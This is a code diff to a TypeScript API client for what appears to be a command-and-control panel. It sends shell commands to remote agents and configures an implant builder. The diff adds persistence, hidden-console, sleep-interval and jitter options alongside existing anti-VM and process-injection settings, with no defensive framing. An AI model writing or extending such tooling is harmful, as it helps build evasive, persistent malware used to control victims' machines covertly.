@@ -138,6 +138,10 @@ class ApiClient {
     return this.request<Task[]>(`/api/agents/${agentId}/tasks`)
   }
 
+  async getTask(taskId: string): Promise<any> {
+    return this.request<any>(`/api/tasks/${taskId}`)
+  }
+
   async executeShell(agentId: string, command: string): Promise<Task> {
     return this.request<Task>(`/api/agents/${agentId}/shell`, {
       method: 'POST',
@@ -329,7 +333,10 @@ class ApiClient {
     form.append('anti_vm', config.AntiVM ? 'true' : 'false')
     form.append('key', config.EncryptedComms ? (config.EncryptionKey || '') : '')
     form.append('injection_method', config.ProcessInjection ? (config.InjectionMethod || 'crt') : 'none')
-    form.append('hide_console', 'true')
+    form.append('persistence', config.Persistence ? 'true' : 'false')
+    form.append('hide_console', config.HideConsole === false ? 'false' : 'true')
+    form.append('sleep_interval', String(config.SleepInterval || 60))
+    form.append('jitter', String(config.Jitter ?? 10))
     if (config.CustomConfig) form.append('custom_config', config.CustomConfig)
 
     const headers: Record<string, string> = {}
